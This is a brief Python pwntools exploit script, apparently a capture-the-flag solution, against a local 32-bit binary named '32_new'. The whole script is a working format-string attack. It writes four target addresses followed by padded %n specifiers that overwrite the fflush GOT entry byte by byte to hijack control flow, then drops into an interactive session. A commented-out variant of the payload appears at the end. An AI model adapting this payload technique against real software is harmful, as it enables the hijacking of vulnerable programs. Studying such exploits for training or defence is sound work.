from pwn import *

target = process('./32_new')

#gdb.attach(target, gdbscript='b *0x080487dc')

print target.recvline()

fflush_adr0 = p32(0x804a028) # --> 0b --> 0x10b - 0x56 = 181
fflush_adr1 = p32(0x804a029) # --> 87 --> 0x87 - 0x0b = 124
fflush_adr2 = p32(0x804a02a) # --> 04 --> 0x104 - 0x87 = 125
fflush_adr3 = p32(0x804a02b) # --> 08 --> 0x08 - 0x04 = 4

fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"
fmt_string3 = "%13$n"


payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fflush_adr3 + "%181x" + fmt_string0 + "%124x" + fmt_string1 + "%125x" + fmt_string2 + "aaaa" + fmt_string3
print payload

target.sendline(payload)
target.interactive()




#payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fflush_adr3 + "%181x" + fmt_string0 + "%124x" + fmt_string1 + "%125x" + fmt_string2 + "1111" + fmt_string3